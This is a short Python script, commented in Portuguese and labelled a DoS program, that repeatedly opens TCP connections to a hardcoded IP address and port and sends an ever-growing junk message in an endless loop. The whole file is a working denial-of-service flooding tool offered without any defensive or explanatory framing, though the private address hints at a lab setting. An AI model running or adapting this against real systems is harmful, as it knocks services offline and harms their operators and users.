#Henrique Haji
#Thauany Moedano

#Programa DoS
import socket,random,sys

#informações da mensagem, alvo e porta
msg="gifhshfdfs^][][][])(*&yavdajhbdajsbda*()()()*(*)jdaskjdhaskj"
alvo="172.21.209.71"
porta=2000

Adr = (alvo,porta)

#Abre uma conexão socket e envia uma mensagem
while True:
    meiaSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    meiaSocket.connect(Adr)
    msg=(msg*6400)
    msgCoded = str.encode(msg)
    meiaSocket.sendall(msgCoded)
    meiaSocket.close()